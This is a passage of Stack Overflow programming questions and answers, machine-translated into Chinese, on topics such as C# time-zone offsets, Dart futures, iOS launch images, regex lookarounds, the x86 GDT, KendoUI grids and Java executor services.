                    offsetsByUTCIntervals.Add(new Tuple<TimeSpan, DateTime, DateTime>(tz.BaseUtcOffset, ConvertTimeToUtc(tEnddate.Add(endTsp.Subtract(adjRule.DaylightDelta)), tz), ConvertTimeToUtc(tStDate.AddTicks(stTsp.Ticks - 1), tz)));
                    offsetsByUTCIntervals.Add(new Tuple<TimeSpan, DateTime, DateTime>(tz.BaseUtcOffset + adjRule.DaylightDelta, ConvertTimeToUtc(tStDate.Add(stTsp.Add(adjRule.DaylightDelta)), tz), ConvertTimeToUtc(yrEndTime, tz))); 
                }
                else
                {
                    offsetsByUTCIntervals.Add(new Tuple<TimeSpan, DateTime, DateTime>(tz.BaseUtcOffset, ConvertTimeToUtc(yrStTime, tz), ConvertTimeToUtc(tStDate.AddTicks(stTsp.Ticks - 1), tz)));
                    offsetsByUTCIntervals.Add(new Tuple<TimeSpan, DateTime, DateTime>(tz.BaseUtcOffset + adjRule.DaylightDelta, ConvertTimeToUtc(tStDate.Add(stTsp.Add(adjRule.DaylightDelta)), tz), ConvertTimeToUtc(tEnddate.AddTicks(endTsp.Ticks - 1), tz)));
                    offsetsByUTCIntervals.Add(new Tuple<TimeSpan, DateTime, DateTime>(tz.BaseUtcOffset, ConvertTimeToUtc(tEnddate.Add(endTsp.Subtract(adjRule.DaylightDelta)), tz), ConvertTimeToUtc(yrEndTime, tz))); 
                }
            }
            else
            {
                offsetsByUTCIntervals.Add(new Tuple<TimeSpan, DateTime, DateTime>(tz.BaseUtcOffset, ConvertTimeToUtc(yrStTime, tz), ConvertTimeToUtc(yrEndTime, tz)));
            }
        }
        return offsetsByUTCIntervals;
    }

    public static DateTime ConvertTimeToUtc(DateTime date, TimeZoneInfo timeZone)
    {
        if (date == null || timeZone == null)
        {
            return date;
        }
        DateTime convertedDate = TimeZoneInfo.ConvertTimeToUtc(date, timeZone);
        return convertedDate;
    }

    //copy from msdn http://msdn.microsoft.com/en-us/library/system.timezoneinfo.transitiontime.isfixeddaterule.aspx
    private static DateTime GetTransitionDate(TimeZoneInfo.TransitionTime transition, int year)
    {
        if (transition.IsFixedDateRule)
            return new DateTime(year, transition.Month, transition.Day);

        int transitionDay;
        var cal = CultureInfo.CurrentCulture.Calendar;
        var startOfWeek = transition.Week * 7 - 6;
        var firstDayOfWeek = (int)cal.GetDayOfWeek(new DateTime(year, transition.Month, 1));
        var changeDayOfWeek = (int)transition.DayOfWeek;

        if (firstDayOfWeek <= changeDayOfWeek)
            transitionDay = startOfWeek + (changeDayOfWeek - firstDayOfWeek);
        else
            transitionDay = startOfWeek + (7 - firstDayOfWeek + changeDayOfWeek);

        if (transitionDay > cal.GetDaysInMonth(year, transition.Month))
            transitionDay -= 7;
        return new DateTime(year, transition.Month, transitionDay);
    }

   /* static void GetOffsets(DateTime startTime, DateTime endTime, TimeZoneInfo tz)
    {
        var result = new HashSet<string>();
        var adjRules = tz.GetAdjustmentRules();
        result.Add(tz.BaseUtcOffset.ToString());

        foreach (var adjustmentRule in adjRules)
        {
            if ((startTime >= adjustmentRule.DateStart && startTime <= adjustmentRule.DateEnd)
                    || (endTime >= adjustmentRule.DateStart && endTime <= adjustmentRule.DateEnd)
                 || (startTime <= adjustmentRule.DateStart && endTime >= adjustmentRule.DateEnd))
            {
                if(adjustmentRule.DaylightDelta != TimeSpan.Zero)
                {
                    if (!result.Contains((tz.BaseUtcOffset + adjustmentRule.DaylightDelta).ToString()))
                      result.Add((tz.BaseUtcOffset + adjustmentRule.DaylightDelta).ToString());
                }
            }
        }
        Console.Write(tz.DisplayName + "   ");
        foreach (var res in result)
        {
            Console.Write(res);
        }
    }*/
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-11T03:36:54.000

如果你对日期做任何复杂的事情，你应该看看[Noda Time](https://code.google.com/p/noda-time/)（它是 Joda Time Java 库的一个端口）。它有一个完整的命名空间来处理棘手的时区问题。

# performance - 在 Dart 中，创建 Future、完成它并返回它是否比创建直接 Future 效率低？

> ID：13328353
> 
> 赞同：0
> 
> 时间：2012-11-11T03:35:53.237
> 
> 标签：performance, dart, future

性能上有什么区别

```
var completer = new Completer<String>();
var future    = completer.future;
completer.complete("value");
return future; 
```

和

```
var future = new Future<String>.immediate("value");
return future; 
```

?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T22:34:33.430

希望很快`Future.immediate`会在后台使用 Completer 使其异步，因此现在的任何性能差异都会消失。

即使在今天，任何这样的性能差异都应该非常小。Completer 和 Future 中的所有代码都是同步的且很小，因此开销由 Completer 的分配和一些方法调用组成。那应该非常非常快。

结果：坚持使用完成者。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-11T21:28:19.317

[new Future.immediate()](http://api.dartlang.org/docs/releases/latest/dart_async/Future.html#Future.immediate)和[Completer.complete()](http://api.dartlang.org/docs/releases/latest/dart_async/Completer.html#complete)都返回一个 Future，其值在下一个事件循环中可用。（这是使用 new Timer(0, callback) 实现的。参见[future_impl.dart](http://code.google.com/p/dart/source/browse/branches/bleeding_edge/dart/sdk/lib/async/future_impl.dart)。）

例如，这两个语句的行为相同：

```
 new Future.immediate('blah').then(print);
  Completer..complete('blah').future.then(print); 
```

DartVM 和 dart2js 应该能够优化掉两个示例之间的任何性能差异。所以使用 Future.immediate()，它更短。

注意：正如[贾斯汀所说](https://stackoverflow.com/questions/13328353/in-dart-is-creating-a-future-completing-it-and-returning-it-less-efficient-tha/13352694#13352694)，Future.immediate() 曾经是同步的，现在不再是这种情况。

# ios - iOS 启动图像不会显示

> ID：13328354
> 
> 赞同：0
> 
> 时间：2012-11-11T03:36:14.300
> 
> 标签：ios, xcode, image, launch

我无法在我的 iPod touch 4 上显示启动图像。我使用的是 Xcode 4.3.3。

我已将此添加到我的 Info.plist 文件中：

```
<key>UILaunchImageFile</key>
<string>Default</string> 
```

我已将 Default.png 复制到 xcappdata 包中的 AppData 文件夹并使用 Organizer 上传。图像尺寸为 320 x 480。我也尝试将图像放在 xcappdata 包的根目录中，但这也没有效果。我是否正确上传图像？

我还尝试将图像拖放到 Xcode 目标摘要选项卡上的“启动图像”，但这没有效果（图标仍然显示“未指定图像”）。

我在 Organizer->Console 下搜索了设备日志，没有看到任何与加载图像相关的错误或警告。有没有办法查看启动图像加载的诊断信息？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T10:09:54.527

我找到了解决方案。图像需要复制到 .app 包的根目录，而不是像我一样的 .xcappdata 包。也许我是盲人，但我在文档中找不到这个。在我的情况下，它无需添加到 Xcode 项目即可工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T10:15:54.107

你真的把这个方法弄得太复杂了。Xcode 有一个 UI 供您浏览和选择所有分辨率的图标和启动图像。它负责将文件复制到项目中并修改项目设置/plist 文件。见下图。

![项目摘要截图](../Images/d3caa3c02520f182f2abaa6d9e2185dc.png)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-18T17:52:35.550

对于 Xcode 4.6，使用 Organizer Documentation 部分，搜索“App-Related Resources”或“iOS App Programming Guide”。App-Related Resources应该是“iOS App Programming Guide”中的一个部分。

该文件提到：

"您的应用程序包中必须包含一个或多个图标。系统在设备的主屏幕上显示您的应用程序时会使用这些图标。有关如何指定应用程序图标的信息，请参阅“应用程序图标”。</p>

和

“所有启动图像都必须是 PNG 文件，并且必须位于应用程序包目录的顶层。”

这是为了让 Xcode 可以找到它们......

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-08-13T19:07:03.160

要更长时间地显示启动图像，您可以在 AppDelegate.m 中执行以下操作

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary*)launchOptions
{
     // Override point for customization after application launch.
     sleep(10);
     return YES;
} 
```

# ios - 关于模态视图行为

> ID：13328355
> 
> 赞同：0
> 
> 时间：2012-11-11T03:36:25.557
> 
> 标签：ios, uiviewcontroller, modal-dialog

我正在制作模态视图。我想要做的是等到模态视图被解除。这是代码。

```
 SelecYourCountryViewController *selecYourCountryViewController = [[SelecYourCountryViewController alloc] initWithNibName:@"SelecYourCountryViewController" bundle:nil];
    selecYourCountryViewController.modalTransitionStyle = UIModalTransitionStyleCrossDissolve;
    [self.presentingViewController presentViewController:selecYourCountryViewController animated:YES completion:nil];
    NSLog(@"select your contry"); 
```

在这段代码中，尽管 modalview(selecYourCountryViewController) 是活动的，但流程会进入下一步。简而言之，在 selectYourCountryViewController 工作时会显示 NSLog。请让我知道等待视图被关闭并获得返回值的方式。

（就像 VisualBasic 行为上的 Msgbox）

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T03:48:01.157

头脑简单的答案是：实施`viewWillAppear:`。此视图出现的原因之一是呈现的视图消失了。

更复杂和正确的答案是：由你来设置，以便当呈现的视图控制器被解除时，如果*这个*控制器需要听到它，呈现的视图控制器有办法向这个控制器发送一条消息，告诉它它正在被解雇。查看 Xcode 中的 Utility 应用程序模板，了解如何做到这一点：呈现控制器向呈现的控制器传递对自身的引用，以便呈现的控制器可以在关闭之前向它发送消息。

您可能还想阅读我书中的讨论：

[http://www.aeth.com/iOSBook/ch19.html#_presented_view_controller](http://www.apeth.com/iOSBook/ch19.html#_presented_view_controller)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T07:32:21.273

虽然我很同情您渴望 VB 的便利性`MsgBox`，但底线是，这不是它在 iOS 中的工作方式（出于某些充分的理由）。辅助视图控制器告诉第一个视图控制器某事已完成的正确方法是通过委托。（请参阅*View Controller Programming Guide*中的[Using Delegation to Communicate with Other Controllers](http://developer.apple.com/library/ios/featuredarticles/ViewControllerPGforiPhoneOS/ManagingDataFlowBetweenViewControllers/ManagingDataFlowBetweenViewControllers.html#//apple_ref/doc/uid/TP40007457-CH8-SW9) 。 ）或者，您可以让辅助视图实际触发下一步。

 *如果您尝试 on `viewWillAppear`，您必须确定它出现的原因，即初始外观，因为辅助视图成功并已被关闭，因为辅助视图被取消并关闭等。另外，请注意，如果您曾经转换到 iPad 应用程序并使用弹出框，请记住，`viewWillAppear`当弹出框被关闭时，您将不会获得该方法等）。只是需要注意的一些小事情。*

# objective-c - 如何使用 AVAudioRecorder 数据并将其转换为 C++ 的原始音频？

> ID：13328357
> 
> 赞同：1
> 
> 时间：2012-11-11T03:36:42.237
> 
> 标签：objective-c, audio, core-audio

我一直在寻找在 mac 中从哪里获取麦克风输入，并且出现了来自 Objective C 的 AVAudioRecorder 类。我已经设法将音频录制到文件中，但是如何使用 AVAudioRecorder 然后将其核心音频格式数据转换为原始音频以在 C++ 代码中使用，例如 PocketSphinx？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T00:15:36.853

Audio Queue API 和 RemoteIO Audio Unit 将允许从 iOS 设备上的麦克风获取原始音频样本缓冲区。

# java - 使用网络摄像头改进条码扫描 - Java

> ID：13328362
> 
> 赞同：1
> 
> 时间：2012-11-11T03:38:13.480
> 
> 标签：java, opencv, webcam, barcode, javacv

我正在从事一个必须读取和输出条形码数据的项目。它使用标准的罗技相机拍照。它使用 JavaCV（Java 的 OpenCV 包）访问网络摄像头并拍照。图片存储后，使用Zxing包读取并输出条码数据。

该程序有效，但还不够好。它可以处理相当大的条码，但无法读取任何正常大小的条码。我的理论是相机的分辨率不够好。但是，我想问一下这里是否有人知道我如何通过代码改进条形码阅读器。（即通过JavaCV之类的对焦相机）

tl：dr 版本：无论如何我可以通过 JavaCV 提高图像质量以读取条形码吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T08:43:38.813

我有一个类似的问题。

使用 QZXing（ZXing 到 Qt 的一个端口）我得到了 2D（DataMatrix）解码（具有足够好的图像），但是 1D 条码，即使明显大而清晰，有时也完全错过了。多么痛苦……

我尝试引入一些 GUI，迫使用户设计 ROI……这完全解决了 2D，但仍然 1D 有时会出现问题。

然后我切换到[ZBar](http://zbar.sourceforge.net/)，它适用于 1D。现在 ZXing 只处理 2D，OTOH ZBar 不处理 DataMatrix ......

我建议不要增加图像分辨率。我试图在OpenCV中找到一些ROI检测助手，但到目前为止我还没有找到一个简单的方法......

# javascript - Modernizr 与 Rails Turbolinks 宝石

> ID：13328363
> 
> 赞同：1
> 
> 时间：2012-11-11T03:38:16.120
> 
> 标签：javascript, ruby-on-rails, modernizr, turbolinks

我最近决定将 Rails gem 'turbolinks' 添加到项目中，但它不起作用。稍后进行一些加减运算，我发现如果我删除了modernizr.js，它就可以工作。我使用modernizr 是为了兼容性，因为该项目将让人们从一堆不同的设备和浏览器访问它。

有没有人有解决方法？我可以对modernizr.js 或turbolinks.js 进行一组简单的更改以使它们更好地协同工作吗？是否有另一个简单的选项可以做这些中的任何一个并且可以与另一个一起使用？

任何帮助将非常感激。我绝对不是 javascript 专家，所以解释会很好。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-01T13:10:01.420

这是我遇到的一个问题

[https://github.com/rails/turbolinks/issues/270](https://github.com/rails/turbolinks/issues/270)

您需要在头部包含现代化器，并且可以在正文中包含 js

# c# - 如何编写执行以下操作的正则表达式？

> ID：13328364
> 
> 赞同：0
> 
> 时间：2012-11-11T03:38:27.200
> 
> 标签：c#, regex

假设单词“ABC”是关键字，

并且正则表达式模式是

```
[^a-z^A-Z]ABC[^a-z^A-Z] 
```

我希望以下输入返回 true：

```
 hello how are you ABC hello how are you
 hello how are you.ABC0hello how are you 
```

以下输入返回false：

```
"hello how are youABChello how are you" 
```

问题是，如果“ABC”出现在字符串的开头或结尾，则正则表达式不会拾取它。如果我不写 [^az^AZ] 而写 [^az^AZ]* 那么我不想要的字符串也会被选中。

编写这个正则表达式的正确方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T03:47:10.450

使用`negative lookbehind`和`lookahead`断言：

```
var pattern = new Regex("(?<![a-zA-z])ABC(?![a-zA-z])"); 
```

请参阅：http: [//msdn.microsoft.com/en-us/library/az24scfc.aspx#grouping_constructs](http://msdn.microsoft.com/en-us/library/az24scfc.aspx#grouping_constructs)

# android - 如何使用 android 手机识别 3d 对象

> ID：13328368
> 
> 赞同：-5
> 
> 时间：2012-11-11T03:39:07.250
> 
> 标签：android

我正在开发一个安卓应用程序。我希望我的应用程序能够识别我的手机摄像头所暴露的 3d 对象。目前我能够实现二维物体识别。但是我想知道如何在 android 中实现 3d 对象识别。例如，如果我的应用程序的用户将相机镜头聚焦在微波炉上，应用程序应该识别出这个微波炉是松下的。我浏览了 Google Googles，但它只能识别 2d 对象，而我的应用程序无论如何都可以做到这一点。我想知道一种识别 3d 对象的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:06:33.770

这是因为没有公开可用的库或 API 用于处理 3D 图像文件的对象识别。

考虑到目前 3D 图像没有标准文件格式，这是意料之中的。大多数 3D 图像文件都是适当的，通常将两个 2D 图像以标准格式（如 JPEG）组合在自己的容器中。如果您想要 3D 的用户体验，一个更好的解决方案是向用户显示 3D 图像并将 2D 副本发送给服务器（包括将设备上的 3D 格式转换为板载 2D 或在 2D 中连续拍摄第二张照片）。

底线是这不适用于 Google Goggles 或 OpenCV。即使是那些也远非实时。请记住，我们使用的是慢速计算机和慢速互联网连接和低端相机。

作为 Evo3D 的拥有者，我能理解您的需求。目前，该技术领先于可用的软件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-29T17:29:18.800

我希望这个信息帮助。我找到了上述问题的答案。Aurasma 是为 Android 和 IOS 开发的工具，能够识别现实生活中的物体。因此，参考与上述相同的示例，您的包含 aurasma 内核的 android 应用程序将识别微波炉，并且根据您提供的信息，它将在每次遇到目标图像/产品时展示该信息。即使谷歌还没有推出物体识别技术，Aurasma 已经为我们提供了这种解决方案。我认为攻读博士学位并专攻 3D 机器视觉是一个较长的过程。有些人在回复这篇文章时表现得很不成熟。没问题。如果 Aurasma 内核能满足您的目的，我会很高兴。干杯。

# xaml - 为什么在 WinRT 中为枚举依赖属性设置默认值会失败？

> ID：13328369
> 
> 赞同：2
> 
> 时间：2012-11-11T03:39:11.283
> 
> 标签：xaml, windows-runtime, dependency-properties, winrt-xaml

我正在尝试使用枚举作为依赖属性的类型，但任何默认设置似乎都失败了。

编译成功，但是当我尝试在 XAML 中使用该对象时，我得到一个“Specified Cast is not Valid”错误和我的对象上的蓝色下划线。

VS2012 使用 WinRT。

我究竟做错了什么？

这是我正在使用的代码：

```
public class WheelPanel : Panel
{
    public enum ItemAlignmentOptions
    {
        Left, Center, Right
    }

    /// <summary>
    /// Identifies the <see cref="ItemAlignment" /> dependency property.
    /// </summary>

    // This fails using null

    //public static readonly DependencyProperty ItemAlignmentProperty = DependencyProperty.Register(
    //    ItemAlignmentPropertyName,
    //    typeof(ItemAlignmentOptions),
    //    typeof(WheelPanel),
    //    new PropertyMetadata(null,new PropertyChangedCallback(ItemAlignmentChanged)));

    // This fails using a default value

    //public static readonly DependencyProperty ItemAlignmentProperty = DependencyProperty.Register(
    //    ItemAlignmentPropertyName,
    //    typeof(ItemAlignmentOptions),
    //    typeof(WheelPanel),
    //    new PropertyMetadata(ItemAlignmentOptions.Center,new PropertyChangedCallback(ItemAlignmentChanged)));

    // This works!
    public static readonly DependencyProperty ItemAlignmentProperty = DependencyProperty.Register(
        ItemAlignmentPropertyName,
        typeof(ItemAlignmentOptions),
        typeof(WheelPanel),
        new PropertyMetadata(new PropertyChangedCallback(ItemAlignmentChanged)));

    /// <summary>
    /// The <see cref="ItemAlignment" /> dependency property's name.
    /// </summary>
    public const string ItemAlignmentPropertyName = "ItemAlignment";

    /// <summary>
    /// Gets or sets the value of the <see cref="ItemAlignment" />
    /// property. This is a dependency property.
    /// </summary>
    public ItemAlignmentOptions ItemAlignment
    {
        get { return (ItemAlignmentOptions)GetValue(ItemAlignmentProperty); }
        set { SetValue(ItemAlignmentProperty, value); }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T03:31:34.157

尝试使用“1”作为值。枚举的底层类型是 Int32 （默认情况下），也许它需要一个整数作为默认值。

# c# - C#复选框，只选中框而不是文本

> ID：13328371
> 
> 赞同：0
> 
> 时间：2012-11-11T03:39:53.437
> 
> 标签：c#, button, checkbox

好的，我发誓我在发布之前在谷歌上寻找过这个。

我试过了：

C# 复选框活动区域 C# 复选框 复选框不是文本

和其他一些人。

但我在按钮顶部有一个复选框。即使鼠标位于复选框文本区域的顶部，我也希望能够单击该按钮。我希望用户只能单击实际框。但是当鼠标悬停在复选框的文本上时，它应该单击按钮。

谢谢大家！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T03:54:43.793

我假设这是在 WPF / XAML 中。

只需将复选框添加到不带文本的按钮即可。将文本添加到按钮而不是复选框。

话虽如此，我想不出为什么这会是一种愉快的用户体验，并建议尝试使用不同的方式获取信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T14:22:38.803

因此，我没有在按钮上方设置复选框，而是创建了一个单独的窗口，单击该按钮时将显示三个选项供您选择。

但我仍然认为将它们放在按钮顶部会很酷/整洁。

# linux - nohup 命令有不同的 kill /dev/null

> ID：13328372
> 
> 赞同：1
> 
> 时间：2012-11-11T03:40:25.213
> 
> 标签：linux

我有一个 shell 脚本 runProgram.sh，它启动批处理作业并在作业完成后发送带有输出的电子邮件。我使用 nohup 在后台运行它。它工作正常。

nohup ./runProgram.sh &

缺点是 nohup.out 文件会减慢我的系统速度，甚至会杀死其他正在运行的进程。所以我改变了 nohup 如下 kill nohup.out （我根本不需要它）。

nohup ./runProgram.sh > /dev/null &

现在，问题是一旦作业开始，就会发送一封带有先前运行输出的电子邮件。当前输出电子邮件不会在作业结束时发送。

我确实搜索并找不到答案。非常感谢您的帮助。

谢谢，DZ

我有一个 Unix 初学者。我使用 nohup 执行一个 shell 脚本，该脚本基本上执行一项工作并在工作完成后发送一封电子邮件。它工作正常。但是当我将 nohup.out 重定向到 /dev/null 时。电子邮件将在开始工作而不是结束时发送。

nohup 执行作业

# php - 如何从 php 中的 HTML 选择元素中获取所有值？

> ID：13328379
> 
> 赞同：0
> 
> 时间：2012-11-11T03:42:29.743
> 
> 标签：php, post, html-select

我有一个带有两个选择元素（列表框）和两个按钮的 HTML 表单，用于将数据从一个列表框移动到另一个列表框（使用 JavaScript）：

```
 <form action="page.php" method="post">
        <select name="select1" multiple="yes">
            <option value="1">Left1</option>
            <option value="2">Left2</option>
            <option value="3">Left3</option>
        </select>
        <input type="button" value="--&gt;" onclick="moveOptions(this.form.select1, this.form.select2);" /><br />
        <input type="button" value="&lt;--" onclick="moveOptions(this.form.select2, this.form.select1);" />
        <select name="select2" multiple="yes">
            <option value="4">Right1</option>
            <option value="5">Right2</option>
        </select>
        <input type="submit" name="submit" value="Submit">
</form> 
```

当我点击提交按钮时，我想获取存储在列表框中的**所有值。**

```
foreach ($_POST['select1'] as $value)
    {
        //save data to database
    } 
```

这只会获得一个选定的值（如果有的话）。

我设法通过`[]`在`select`.

```
<select name="select1[]" multiple="yes"> 
```

但这仍然没有得到未选择的值，这样数据移动 JavaScript 函数也不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T04:00:04.057

在提交表单之前，只需选择所有选项：

```
document.getElementsByName('submit')[0].onclick = function () {
    var s1 = document.getElementsByName('select1')[0];
    for(var i=0; i < s1.options.length; i++){
        s1.options[i].selected = true;
    }
}; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T03:47:40.157

```
var select1 = document.getElementById('select1');
var values = new Array();

for(var i=0; i < select1.options.length; i++){
    values.push(select1.options[i].value);
} 
```

要在页面之间传递数组，[请转到此处](https://stackoverflow.com/questions/1548159/php-how-to-send-an-array-to-another-page)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T03:51:08.433

我不确定您为什么要这样做，但您可以在提交表单之前调用此 Jquery 代码并将数组值添加到隐藏输入以进行发布

```
$("#Submit_button").click ( function() {
        var arr = new Array;
        $("#select1 option").each ( function() {
            arr.push ( $(this).val() );
        });
        $(#hidden_input).val(arr);
    }); 
```

# intel - 为什么 GDT 不被视为一个段？

> ID：13328380
> 
> 赞同：1
> 
> 时间：2012-11-11T03:42:36.997
> 
> 标签：intel, cpu-architecture, gdt

> 除了构成程序或过程的执行环境的代码、数据和堆栈段之外，该体系结构还定义了两个系统段：任务状态段 (TSS) 和 LDT。
> 
> GDT 不被视为一个段，因为它不是通过段选择器和段描述符访问的。TSS 和 LDT 具有为它们定义的段描述符。
> 
> **-- Intel 64 和 IA32 架构软件手册 3A,2.1.2**

我对*为什么*不将 GDT 视为一个部分感到困惑。

谁能给个详细的解释？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T03:44:25.723

GDT 作为查找所有内容的第一个点，不能通过选择器访问，因为这会给您带来先有鸡还是先有蛋的情况。

GDT 本身具有各种 TSS 和 LDT 内存块的描述符，因此它们*被*视为段，可通过段选择器访问。此外，各个 LDT 具有其他内存区域的选择器，因此这些区域也是段。

但是您只需要问自己，当 GDT 是选择过程的第一个入口点时，您会在哪个表中查找描述符以定位 GDT？

实际上，当您加载 GDT 的地址（使用`LGDT`指令）时，它是您使用的*线性地址，而不是选择器。*来自 x86 开发人员指南：

> LGDT 和 LIDT 指令仅用于操作系统软件；它们不在应用程序中使用。它们是唯一直接加载线性地址（即，不是段相对地址）和保护模式下的限制的指令。它们通常在实地址模式下执行，以允许处理器在切换到保护模式之前进行初始化。

这就是为什么他们说 GDT 不被视为一个细分市场。

# asp.net-web-api - 如何使用 Asp.net Web API 获取用户指定的数据

> ID：13328382
> 
> 赞同：1
> 
> 时间：2012-11-11T03:42:53.067
> 
> 标签：asp.net-web-api

我使用 Internet 应用程序模板创建了 MVC4 应用程序，添加了一个具有授权属性的 API 控制器。如何使 api 控制器操作返回用户指定的数据？

目前我正在使用 WebSecurity.GetUserID 来获取用户 ID，我在数据表中有用户 ID。编译应用程序后，如果我先调用 api 控制器操作，我将收到以下错误消息：

> 在调用“WebSecurity”类的任何其他方法之前，您必须调用“WebSecurity.InitializeDatabaseConnection”方法。此调用应放置在站点根目录中的 _AppStart.cshtml 文件中。

如果我先去 MVC 控制器动作，然后再次进入 api 动作，它工作正常。

我想知道如何解决这个问题，以及使用 web api 和 MVC4 处理用户指定数据的最佳实践是什么，谢谢。

# telerik - KendoUI 网格 InCell 编辑样式问题

> ID：13328383
> 
> 赞同：0
> 
> 时间：2012-11-11T03:42:58.837
> 
> 标签：telerik, telerik-grid, telerik-mvc

我在网格编辑（GridEditMode.InCell）中使用 ASP.NET MVC 4 和 Telerik 的 KendoUI 网格控件。我能够在网格中查看数据并编辑数据，但问题是当我单击单元格进行编辑时，我没有获得 Kendo UI 控件（DatePicker，...）。我要编辑的控件很简单，没有任何样式。当我在页面上添加任何 Kendo 控件时，我得到了正确的控件，例如 DatePicker 控件。所以样式和控件的js就在那里。唯一的问题是我没有在网格内获得剑道控制。

> 索引.cshtml

```
@using Kendo.Mvc.UI
@using KendoGrid.Models
@(Html.Kendo().Grid<Person>()    
    .Name("Grid")    
    .Columns(columns => {        
        columns.Bound(p => p.FirstName).Width(140);
        columns.Bound(p => p.LastName).Width(140);
        columns.Bound(p => p.DayOfBirth).Width(200);
                            columns.Bound(p => p.Age).Width(150);
        columns.Command(command => command.Destroy()).Width(110);
    })
            .ToolBar(toolbar =>
            {
                toolbar.Create();
                toolbar.Save();
            })
    .Editable(editable => editable.Mode(GridEditMode.InCell))
    .Pageable()
    .Sortable()
    .Scrollable()
    .DataSource(dataSource => dataSource        
        .Ajax()         
        .Batch(true)
        .ServerOperation(false)
        .Events(events => events.Error("error_handler"))
        .Model(model => model.Id(p => p.Id))
        .Read("Read", "Grid")
        .Create("Create", "Grid")
        .Update("Update", "Grid")
        .Destroy("Destroy", "Grid")
    )
      )

          <div style="margin-top: 20px">
        @(Html.Kendo().DatePicker()
              .Name("datepicker")
              .Value("10/10/2011")
              .HtmlAttributes(new { style = "width:150px" })
        )
    </div>
<script type="text/javascript">
    function error_handler(e) {
        if (e.errors) {
            var message = "Errors:\n";
            $.each(e.errors, function (key, value) {
                if ('errors' in value) {
                    $.each(value.errors, function () {
                        message += this + "\n";
                    });
                }
            });
            alert(message);
        }
    }
</script> 
```

> _Layout.cshtml

```
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8" />
    <title>@ViewBag.Title</title>
    <link rel="stylesheet" href="@Url.Content("~/Content/kendo.common.min.css")">
    <link rel="stylesheet" href="@Url.Content("~/Content/kendo.default.min.css")">
    <link rel="stylesheet" href="@Url.Content("~/Content/examples-offline.min.css")">
    <script src="@Url.Content("~/Scripts/jquery.min.js")"></script>
    <script src="@Url.Content("~/Scripts/kendo.web.min.js")"></script>
    <script src="@Url.Content("~/Scripts/kendo.aspnetmvc.min.js")"></script>
    <script src="@Url.Content("~/Scripts/console.min.js")"></script>
    <script src="@Url.Content("~/Scripts/prettify.min.js")"></script>
    @RenderSection("HeadContent", false)
</head>
<body>
    <div class="page">

        <div id="example" class="k-content">
            @RenderBody()
        </div>

    </div>
</body>
</html> 
```

这就是 ingrid DatePiker 控件现在的样子 ![这就是现在的样子](../Images/2e0bafd0a21daad5f27e45a7217c0101.png)

这就是 DatePicker 的样子。 ![这就是它的样子](../Images/034e113ba6ac98de2e11b85b92f371d3.png)

提前致谢。

真诚的，弗拉德

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T07:38:31.780

很可能您缺少**Views/Shared/EditorTemplates**文件夹下的 EditorTemplates 。检查它们包含的离线演示（因为您共享了屏幕截图；））。

使用相同的名称将它们复制并粘贴到您的解决方案中。

# node.js - node.js request.js 为什么我的IP地址变了？

> ID：13328384
> 
> 赞同：2
> 
> 时间：2012-11-11T03:43:18.450
> 
> 标签：node.js, http, request

只需向 whatismyip.org 发出一个简单的 GET 请求，我每次都会得到不同的 IP。如果它在我的浏览器中访问该网站，它总是一样的。这是怎么回事？我只是在我的 Windows 7 机器上本地运行 node.js。我怎么可能使用不同的IP？

```
request('http://www.whatsmyip.org/', function (error, response, body) {
    if (!error && response.statusCode == 200) {
        res.render('index', {content:body;});
    }
}); 
```

我觉得`http://www.whatsmyip.org`知道这是一个自动请求并且在拖钓我。xD

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T03:52:43.773

阅读 IP 地址正上方的 HTML 注释：

```
<!--
Please DO NOT program a bot to use this site to grab your IPs. It kills my server and thats not nice.
Just get some cheap or free web hosting and make your own IP-only page to power your bot.
Then you won't even have to parse any html, just load the IP directly - better for everyone!!
--> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T03:57:51.357

看起来该站点正在使用 JavaScript 来更新页面上的跨度，因此如果您正在执行一个简单的 HTTP 请求，那么它将不会被更新为正确的值。如果您使用 Web 浏览器访问该站点，但只是查看源代码（不使用任何更新的检查器）并刷新，那么显示的 IP 似乎是随机的。

# java - ScheduledExecutorService 一段时间后没有运行

> ID：13328386
> 
> 赞同：0
> 
> 时间：2012-11-11T03:43:34.013
> 
> 标签：java, executorservice, scheduledexecutorservice

我有两个每秒运行的执行器服务。但是当我在 run 方法中插入一行代码时，其中一个停止运行。这是我的课程：

游戏服务器：

```
public class GameServer implements Runnable {

    private ServerManager server;
    private int id;

    public GameServer(ServerManager sm) {
        server = sm;
        id = server.idCreator();
        server.registerGameServer(this);
    }

    @Override
    public void run() {
        System.out.println("Game server is collecting data every second");
    }

    public int getId() {
        return id;
    }
} 
```

服务器管理器：

```
import java.util.HashMap;
import java.util.Random;
import java.util.concurrent.atomic.AtomicInteger;

public class ServerManager {

    private final AtomicInteger count = new AtomicInteger(0);
